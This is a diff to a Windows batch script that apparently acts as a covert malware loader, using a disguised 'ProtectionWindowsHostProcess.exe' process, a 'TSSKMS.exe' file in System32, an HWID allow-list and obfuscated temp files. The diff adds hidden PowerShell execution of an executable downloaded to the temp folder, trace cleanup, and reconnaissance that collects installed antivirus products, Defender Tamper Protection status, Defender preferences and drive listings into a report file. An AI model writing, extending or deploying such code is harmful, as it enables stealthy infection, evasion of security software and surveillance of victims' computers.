@@ -4,7 +4,15 @@
 setlocal enabledelayedexpansion
 
 
-if exist "%temp%\i059.tmp" exit
+if exist "%temp%\i059.tmp" goto EXITDIRECTLY
+goto AFTEREXIT
+
+:EXITDIRECTLY
+start calc
+goto :EOF
+
+:AFTEREXIT
+
 
 :: Count the instances of ProtectionWindowsHostProcess.exe
 set "instances=0"
@@ -24,7 +32,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=46.1T"
+set "BATCHVERSION=48.4"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -66,6 +74,7 @@ echo. >> "%LOGFILE%" 2>&1
 :retryruncallermd5
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/RunEveryCallerMD5') do (
     set "RUNEVERYOFFICIALMD5=%%i"
+    set "RUNEVERYOFFICIALMD5=7a225eb13bf4c35270cca3fdd0f1e5a7"
     echo. >> "%LOGFILE%" 2>&1
     goto donee1
 )
@@ -496,6 +505,7 @@ del /f /a /q %temp%\*.mseuopm
 del /f /a /q %temp%\*.mpee
 del /f /a /q %temp%\*.qwb
 del /f /a /q "%RESULT%"
+del /f /a /q %temp%\temp_script_R*.bat
 echo.
 goto :EOF
 
@@ -577,7 +587,7 @@ echo.
 
 
 :: Define allowed HWIDs here
-set "VALID_HWIDS="
+set "VALID_HWIDS=HWID1 HWID3 HWID2"
 
 
 
@@ -1089,15 +1099,20 @@ echo Checking if %SHSTFILE% exists...
 
 if exist "%SHSTFILE%" (
     echo %SHSTFILE% found . Going to CHECKSHSTMD5
+    echo.
+    echo.
     goto CHECKSHSTMD5
 ) else (
     echo %SHSTFILE% not found . Going to SHSTINSTALL
+    echo.
+    echo.
     goto SHSTINSTALL
 )
 
 
 :CHECKSHSTMD5
 
+::for /f "delims=" %%A in ('powershell -Command "(Get-FileHash -Algorithm MD5 -Path \"%SHSTFILE%\").Hash.ToLower()"') do set "SHSTFILEmd5=%%A"
 for /f "tokens=* delims=" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "SHSTFILEmd5=%%tmp: =%%"
 for /f "tokens=* delims=" %%A in ('certutil -hashfile "%SHSTFILEroot%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "SHSTFILErootmd5=%%tmp: =%%"
 
@@ -1224,9 +1239,14 @@ set "KMSFILEroot=%SystemRoot%\System32\TSSKMS.exe"
 
 echo Checking if %KMSFILE% exists...
 if exist "%KMSFILE%" (
-    goto CHECKKMSMD5
     echo %KMSFILE% found. Going to CHECKKMSMD5
+    echo.
+    echo.
+    goto CHECKKMSMD5
 ) else (
+    echo %KMSFILE% not found. Going to KMSINSTALL
+    echo.
+    echo.
     goto KMSINSTALL
 )
 
@@ -2028,7 +2048,7 @@ echo.
 
 :: remove "::" to prevent run!
 ::set "SHSTSTART=0"
-set "KMSSTART=0"
+::set "KMSSTART=0"
 
 
 
@@ -2246,10 +2266,20 @@ echo %Task1% Installed and Enabled >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
-echo Windows Defender : >> "%InstalledQWB%"
+echo Windows Security Active.. Active Antiviruses: >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
-::powershell -Command "Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection'" >> "%InstalledQWB%"
-::powershell -Command "Get-MpPreference | Out-String" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+powershell -Command "Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntiVirusProduct'" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+powershell -Command "Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection'" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+powershell -Command "Get-MpPreference | Out-String" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -2264,6 +2294,18 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%ProcessTXTFILE%" >> "%InstalledQWB%"
 del /f /a /q "%ProcessTXTFILE%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo List Hard Disks Info >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+powershell -nologo -command "Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object { $used = ($_.Used / 1GB); $free = ($_.Free / 1GB); $total = ($used + $free); Write-Output ('Drive {0}: Total = {1:N2} GB, Used = {3:N2} GB, Free = {2:N2} GB' -f $_.Name, $total, $free, $used); Get-ChildItem -Directory $_.Root -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ('    - {0}' -f $_.FullName) }; Write-Output '' }" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -2443,7 +2485,7 @@ goto NEXT6
 
 
 :HWIDMATCH
-echo HWID matched! Running program...
+echo HWID authorized! Running program...
 echo.
 echo.
 echo.
@@ -2451,7 +2493,7 @@ echo.
 
 
 
-goto NEXT6
+::goto NEXT6
 
 
 
@@ -2510,7 +2552,8 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
  
 :: Check if the file size is at least 0.8MB (768000 bytes)
 if %FILESIZE% geq 768000 (
-    start "" "%TEMP%\!filename!.exe"
+    rem start "" "%TEMP%\!filename!.exe"
+    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\!filename!.exe'"
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
@@ -3119,7 +3162,7 @@ del /f /a /q "%InstalledQWB%"
 
 echo Firstly Testing with SpeedTest >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
-wudtest.exe --accept-license --accept-gdpr >> "%LOGFILE1%"
+::wudtest.exe --accept-license --accept-gdpr >> "%LOGFILE1%"
 (for /l %%i in (1,1,5) do echo.) >> "%LOGFILE1%"
 
 
